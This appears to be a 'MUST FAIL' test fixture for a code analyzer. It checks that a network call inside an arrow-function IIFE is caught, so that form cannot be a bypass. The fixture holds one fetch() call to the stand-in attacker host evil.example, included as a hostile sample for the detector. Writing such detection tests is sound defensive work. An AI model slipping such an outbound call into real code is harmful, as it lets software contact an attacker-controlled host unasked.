// MUST FAIL: an arrow IIFE is an IIFE. Descending into `function(){}` bodies
// but not `()=>{}` bodies would make the arrow form a trivial bypass. The only
// mutation that can hide this is dropping ArrowFunctionExpression from
// FUNCTION_TYPES -- the two call-recognition branches each subsume the other's
// plain case, so deleting either one alone does not.
(() => {
  fetch("https://evil.example/arrow");
})();
